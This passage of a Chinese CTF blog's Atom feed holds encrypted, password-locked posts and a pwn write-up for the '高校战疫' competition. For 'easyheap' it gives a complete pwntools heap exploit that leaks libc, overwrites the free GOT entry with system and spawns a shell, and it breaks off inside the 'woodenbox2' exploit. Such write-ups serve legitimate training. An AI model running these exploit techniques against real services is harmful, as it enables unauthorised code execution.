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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-24T12:22:10.151Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 